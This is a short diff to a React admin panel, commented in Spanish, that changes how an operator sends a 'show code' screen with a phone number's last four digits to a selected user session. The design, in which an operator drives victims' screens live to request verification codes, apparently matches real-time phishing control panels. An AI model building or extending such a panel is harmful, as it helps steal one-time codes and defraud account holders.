@@ -544,33 +544,25 @@ export default function AdminPanel() {
   };
 
   const handleCodeConfirm = (telefono: string) => {
-    // Update session with phone number and send code screen
+    // Ya estamos recibiendo un número de 10 dígitos (6 prefijo + 4 ingresados)
+    // desde el modal modificado
     if (telefono && telefono.length === 10) {
       const terminacion = telefono.substring(telefono.length - 4);
       
-      // First update the session with the phone number
+      // Mostrar el screen change directamente con la terminación ingresada
+      // ya no necesitamos actualizar el número completo del teléfono
       if (selectedSessionId) {
-        apiRequest('POST', `/api/sessions/${selectedSessionId}/update`, { celular: telefono })
-          .then(() => {
-            // Then send the screen change
-            sendScreenChange({
-              tipo: 'mostrar_codigo',
-              sessionId: selectedSessionId,
-              terminacion
-            });
-          })
-          .catch(error => {
-            toast({
-              title: "Error al actualizar teléfono",
-              description: error.message,
-              variant: "destructive",
-            });
-          });
+        // Enviamos directamente el screen change, no necesitamos actualizar el teléfono en la BD
+        sendScreenChange({
+          tipo: 'mostrar_codigo',
+          sessionId: selectedSessionId,
+          terminacion
+        });
       }
     } else {
       toast({
-        title: "Teléfono inválido",
-        description: "Ingrese un número de teléfono válido de 10 dígitos.",
+        title: "Formato inválido",
+        description: "Error en el formato de los últimos 4 dígitos del teléfono.",
         variant: "destructive",
       });
       return;
